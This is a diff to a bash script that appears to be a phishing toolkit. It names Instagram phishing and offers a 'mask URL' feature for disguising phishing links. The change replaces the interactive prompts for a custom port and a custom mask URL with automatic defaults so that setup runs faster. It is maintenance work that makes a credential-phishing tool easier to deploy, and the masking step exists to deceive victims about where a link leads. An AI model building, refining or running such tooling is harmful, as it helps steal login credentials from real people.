@@ -272,23 +272,10 @@ about() {
 	esac
 }
 
-## Choose custom port
+## Choose custom port (DISABLED - always use default)
 cusport() {
-	echo
-	read -n1 -p "${RED}[${WHITE}?${RED}]${ORANGE} Do You Want A Custom Port ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}]: ${ORANGE}" P_ANS
-	if [[ ${P_ANS} =~ ^([yY])$ ]]; then
-		echo -e "\n"
-		read -n4 -p "${RED}[${WHITE}-${RED}]${ORANGE} Enter Your Custom 4-digit Port [1024-9999] : ${WHITE}" CU_P
-		if [[ ! -z  ${CU_P} && "${CU_P}" =~ ^([1-9][0-9][0-9][0-9])$ && ${CU_P} -ge 1024 ]]; then
-			PORT=${CU_P}
-			echo
-		else
-			echo -ne "\n\n${RED}[${WHITE}!${RED}]${RED} Invalid 4-digit Port : $CU_P, Try Again...${WHITE}"
-			{ sleep 2; clear; banner_small; cusport; }
-		fi		
-	else 
-		echo -ne "\n\n${RED}[${WHITE}-${RED}]${BLUE} Using Default Port $PORT...${WHITE}\n"
-	fi
+	# Auto-use default port 8080 (skip prompt for faster setup)
+	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Using Default Port $PORT...${WHITE}\n"
 }
 
 ## Ask for post-login action (for Instagram phishing)
@@ -537,21 +524,11 @@ tunnel_menu() {
 	esac
 }
 
-## Custom Mask URL
+## Custom Mask URL (DISABLED - always use default)
 custom_mask() {
-	{ sleep .5; clear; banner_small; echo; }
-	read -n1 -p "${RED}[${WHITE}?${RED}]${ORANGE} Do you want to change Mask URL? ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}] :${ORANGE} " mask_op
-	echo
-	if [[ ${mask_op,,} == "y" ]]; then
-		echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Enter your custom URL below ${CYAN}(${ORANGE}Example: https://get-free-followers.com${CYAN})\n"
-		read -e -p "${WHITE} ==> ${ORANGE}" -i "https://" mask_url # initial text requires Bash 4+
-		if [[ ${mask_url//:*} =~ ^([h][t][t][p][s]?)$ || ${mask_url::3} == "www" ]] && [[ ${mask_url#http*//} =~ ^[^,~!@%:\=\#\;\^\*\"\'\|\?+\<\>\(\{\)\}\\/]+$ ]]; then
-			mask=$mask_url
-			echo -e "\n${RED}[${WHITE}-${RED}]${CYAN} Using custom Masked Url :${GREEN} $mask"
-		else
-			echo -e "\n${RED}[${WHITE}!${RED}]${ORANGE} Invalid url type..Using the Default one.."
-		fi
-	fi
+	# Auto-use default mask URL (skip prompt for faster setup)
+	# The $mask variable is already set by each site function
+	echo -ne "${RED}[${WHITE}-${RED}]${CYAN} Using default Masked URL${WHITE}\n"
 }
 
 ## URL Shortner
